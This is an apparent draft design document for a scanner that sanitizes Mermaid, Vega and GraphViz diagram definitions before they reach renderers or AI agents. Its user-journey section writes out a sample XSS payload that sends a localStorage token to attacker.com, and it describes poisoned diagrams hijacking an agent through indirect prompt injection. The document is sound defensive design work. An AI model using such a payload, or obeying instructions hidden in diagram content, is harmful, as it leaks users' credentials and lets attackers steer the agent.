# Design Doc: Visual Injection Scanner
**Status:** Draft
**Created:** 2026-03-14

## 1. Context and Scope
With the rise of "Visual Injections," attackers are hiding malicious instructions within structured diagram definitions like Mermaid.js and Vega. When an agent processes these definitions, it can be tricked into executing unauthorized commands (XSS) or exfiltrating sensitive data. MCP Any needs a `Visual Injection Scanner` that specifically targets these visual DSLs (Domain Specific Languages) to ensure they are safe before they reach any renderer or are re-ingested into an agent's context.

## 2. Goals & Non-Goals
* **Goals:**
    * Parse and validate diagram definitions (Mermaid, Vega, GraphViz) for known exploit patterns.
    * Neutralize interactive features (e.g., `click` hooks in Mermaid) that can lead to XSS.
    * Detect "Indirect Prompt Injection" hidden within diagram labels or metadata.
    * Integrate with the `Prompt Path Protection Middleware` for a unified content governance flow.
* **Non-Goals:**
    * Implementing the diagram renderers themselves (MCP Any remains a gateway/proxy).
    * Validating the *semantic correctness* of diagrams (focus is purely on security).

## 3. Critical User Journey (CUJ)
* **User Persona:** A developer using an agent that generates architecture diagrams from code.
* **Primary Goal:** Prevent an attacker who has poisoned the codebase from hijacking the agent via a malicious diagram definition.
* **The Happy Path (Tasks):**
    1. Agent reads a file containing a Mermaid diagram.
    2. The diagram contains a hidden XSS payload: `click A href "javascript:fetch('attacker.com?leak=' + localStorage.token)"`.
    3. The `Visual Injection Scanner` intercepts the diagram definition.
    4. The scanner identifies the `click` event and the `javascript:` protocol as high-risk.
    5. The scanner strips the malicious interactive attributes, leaving the visual structure intact.
    6. The agent receives the safe diagram definition and renders it securely.

## 4. Design & Architecture
* **System Flow:**
    `Content Input` -> `DSL Router` -> `Mermaid/Vega/Vega-Lite Parsers` -> `Pattern Matcher & Sanitizer` -> `Safe DSL Output`
    1. **DSL Router**: Identifies the type of diagram (e.g., detects `mermaid` or `flowchart TD` blocks).
    2. **Parsers**: Lightweight AST (Abstract Syntax Tree) parsers for common diagram formats.
    3. **Pattern Matcher**: Checks for forbidden keywords (`javascript:`, `onclick`, `eval`) and sensitive data patterns.
    4. **Sanitizer**: Reconstructs the diagram definition without the dangerous components.
* **APIs / Interfaces:**
    * `VisualScanner.Scan(content: string, format: string) -> (string, bool)`
    * Part of the `Prompt Path Protection` pipeline.
* **Data Storage/State:**
    * `visual_exploit_sigs.json`: Signatures for visual-based injection attacks.

## 5. Alternatives Considered
* **Client-Side Sanitization Only**: Relying on the browser's `securityLevel: strict`. *Rejected* because agents often process this data on the server or use it to inform future actions, making server-side validation mandatory.
* **Blocking All Diagrams**: *Rejected* as diagrams are essential for developer productivity and architecture visualization.

## 6. Cross-Cutting Concerns
* **Security (Zero Trust)**: All diagram definitions are treated as untrusted code.
* **Performance**: Scanners must be extremely fast to avoid introducing latency into agent loops.
* **Observability**: UI dashboard will highlight "Visual Hijack Attempts" with a diff of the sanitized code.

## 7. Evolutionary Changelog
* **2026-03-14:** Initial Document Creation.
